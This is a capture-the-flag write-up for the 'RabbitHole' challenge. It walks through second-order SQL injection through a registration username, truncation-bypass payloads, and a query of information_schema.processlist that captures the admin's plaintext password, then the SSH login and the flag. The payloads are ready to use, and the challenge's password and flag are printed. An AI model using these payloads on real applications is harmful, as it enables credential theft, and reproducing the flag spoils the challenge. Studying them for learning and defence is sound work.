## RabbitHole CTF Write-up: SQL Inception Exploit

This write-up details the "RabbitHole" Capture The Flag (CTF) challenge, focusing on a sophisticated second-order SQL injection technique known as "SQL-inception." The primary goal is to extract the plaintext password of the admin user by intercepting their login query from information_schema.processlist.

## 1. The Main Idea: Second-Order SQL Injection

The core of the "RabbitHole" challenge lies in a second-order SQL injection. This means that a malicious SQL payload isn't executed immediately upon input. Instead, it's stored in the application's database (in our case, as a username during registration). Later, when the application retrieves and processes this stored data for another function (like displaying "last logins"), the stored payload is executed, leading to unintended information disclosure.

A significant restriction in this room is that extracted data is truncated to 16 characters. This necessitates the use of string manipulation functions like MID() and GROUP_CONCAT() to extract data in smaller, manageable chunks.

The challenge also introduces "SQL-inception," a clever technique where we attempt to dump running queries by querying information_schema.processlist to intercept the admin user's password.

## 2. Reconnaissance (Recon)

Initial reconnaissance typically involves:

    Nmap Scan: Reveals open ports, commonly 22 (SSH) and 80 (Web Server).

    Web Service Exploration: The web application is a recruitment campaign registration service.

    Anti-Bruteforce Measures: A key observation is that login attempts consistently take 5 seconds, regardless of correct or incorrect credentials. This hints at database interaction during the login process, which will be crucial for later exploitation.

    Periodic Admin Login: After registering a test user, it's noticed that an admin user logs in approximately every 60 seconds. This periodic activity is the target for our "SQL-inception" attack.

## 3. Vulnerability Discovery: Second-Order SQL Injection

The SQL injection vulnerability is discovered by attempting to register a user with a double quote (") in the username. This triggers a SQL error message:

SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '""" ORDER BY login_time DESC LIMIT 0,5' at line 1


This error confirms that the username input is directly inserted into a SQL query, and the " character breaks the syntax. The error message also reveals that the query ends with ORDER BY login_time DESC LIMIT 0,5, indicating that the injected payload will be reflected on a "last logins" or similar display page.

## 4. Initial Exploitation and Overcoming Truncation

With the injection point identified, the next steps involve information gathering and bypassing the 16-character truncation:

    Dumping Database Name:
    0" union all select null,database()-- -
    This payload, when used as a username, reveals the database name, typically web.

    Dumping Table Names:
    0" UNION SELECT null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'web'-- -
    This reveals tables like logins and users.

    Dumping Column Names (and hitting truncation):
    0" UNION SELECT null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' and table_schema='web'-- -
    At this point, the 16-character truncation becomes evident, as the full column names cannot be displayed.

    Bypassing Truncation with MID() and CONCAT():
    To overcome the truncation, the MID() function (for substring extraction) combined with CONCAT() (to join strings) is used. For example, to dump usernames and passwords:
    0" union all (select null,mid(concat(username,password),1,16) from users limit 0,1) union all (select null,mid(concat(username,password),17,32) from users limit 0,1) union all (select null,mid(concat(username,password),33,48) from users limit 0,1)-- -
    This technique allows extracting data in 16-character chunks. However, cracking the obtained admin hash proves to be a "rabbit-hole" – it's not the intended solution.

## 5. SQL-Inception with information_schema.processlist

Since the admin hash is uncrackable, the focus shifts to the admin's periodic login and the 5-second login delay. This suggests that the admin's login query might be visible in the information_schema.processlist table, which lists all active queries on the MySQL server.

    Initial processlist Probe:
    0" union all select null,info from information_schema.processlist-- -
    Injecting this as a username and observing the "Last logins" page after a minute would reveal fragmented parts of running queries, confirming visibility.

    Filtering Out Self-Queries:
    To isolate the admin's login query and prevent our own injected query from cluttering the results, a WHERE clause is added:
    0" union all select null,info from information_schema.processlist where info not like '%info%'-- -

## 6. The Final Payload

The ultimate payload combines the MID() technique for truncation bypass with the information_schema.processlist query, aiming to extract the admin's login query in 16-character fragments:

        0" union all select null,mid(info,1,16) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,17,32) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,33,48) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,49,64) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,65,80) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,81,96) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,97,112) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,113,128) from information_schema.processlist where info not like '%info%'
        union all select null,mid(info,129,144) from information_schema.processlist where info not like '%info%'-- -


When this payload is injected as a username and the "Last logins" page is viewed (and refreshed periodically), it will display the admin's login query in fragmented pieces, such as:

    SELECT * from us
    ers where (usern
    ame= 'admin' and
    password=md5('*
    ****************
    ****************
    ****************
    ***************'
    ) ) UNION ALL SE


The asterisks (*) here represent the actual characters of the plaintext password that the admin bot is using before it's hashed by md5().

## 7. Using the Python Script to Retrieve the Password

The provided Python script (advanced_sql_exploit_script Canvas, saved as e2.py) automates the process of injecting this payload, fetching the "Last logins" page, reconstructing the fragmented query, and extracting the plaintext password.
How to Use the Script:

    Open the Script: Access the advanced_sql_exploit_script Canvas.

    Set the URL: Locate the url_base_register variable at the top of the script. Change its value to the exact URL of your CTF's registration page (e.g., "http://10.10.39.45/register.php"). The script will automatically derive the "Last logins" page URL from this.

    url_base_register = "http://10.10.39.45/register.php" # <--- CHANGE THIS TO YOUR ACTUAL CTF REGISTRATION URL

    Save the Script: Save the content of the Canvas as a Python file named e2.py.

    Install Dependencies: Ensure you have the requests and BeautifulSoup libraries installed. If not, run:

    pip install requests beautifulsoup4

    Run the Script: Execute the script from your terminal:

    python e2.py

Script Execution and Password Retrieval:

The script will perform the following steps:

    Step 1: Registering User: It will register a new user using the SQL_PAYLOAD as the username. This injects the malicious query into the database.

    Step 2: Waiting for Admin Activity: The script will then enter a loop, continuously fetching the "Last logins" page (url_base_last_logins). It waits for the admin user's periodic login to occur (which happens every 60 seconds in the CTF).

    Extracting and Reconstructing:

        Once the admin's login query is active in information_schema.processlist, your injected payload will cause its fragments to appear on the "Last logins" page.

        The script uses BeautifulSoup to parse the HTML, extract these fragmented pieces (from <td> tags associated with your injected username's entry), and then uses the reconstruct_sql_query_from_fragments function to piece them back together into the full admin login query.

    Plaintext Password Extraction: The script will then specifically look for the password=md5('...') pattern within the reconstructed query. The string found inside the single quotes (') will be the plaintext password. This will be printed under the --- Extracted Plaintext Password --- section in the script's output.

    Example script output for the password part:

    --- Reconstructed Admin Login Query ---
    SELECT * from users where (username= 'admin' andpassword=md5('MySecretPassword123') ) UNION ALL SE

    --- Extracted Plaintext Password ---
    Password: MySecretPassword123


    In this example, MySecretPassword123 is the plaintext password you're looking for.

    Cleanup: Finally, the script attempts to clean up the database by deleting the user created with the injected payload.

## Successful Password Retrieval and Flag Capture

Upon successful execution of the e2.py script, the plaintext password for the admin user was retrieved:

--- Extracted Plaintext Password ---
Password: fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q

[STEP 3] Cleaning up the database...
   Database cleanup payload sent (attempted to delete injected user).

--- Exploit Script Finished ---

With the password fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q, the next step is to log in as the admin user via SSH to the target machine (10.10.39.45):

        ssh admin@10.10.39.45
        admin@10.10.39.45's password: fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q

Upon successful SSH login, the flag.txt file is found in the admin's home directory:

        admin@ubuntu-jammy:~$ ls
        flag.txt
        admin@ubuntu-jammy:~$ cat flag.txt 
        THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
        admin@ubuntu-jammy:~$ 

The flag for the "RabbitHole" CTF is: THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}.
Conclusion

This CTF demonstrates a powerful multi-stage SQL injection attack, combining second-order injection, truncation bypass, and the clever "SQL-inception" technique to extract sensitive information (the admin's plaintext password) from a running database process list. The successful retrieval of the password allowed for SSH access and ultimate flag capture.
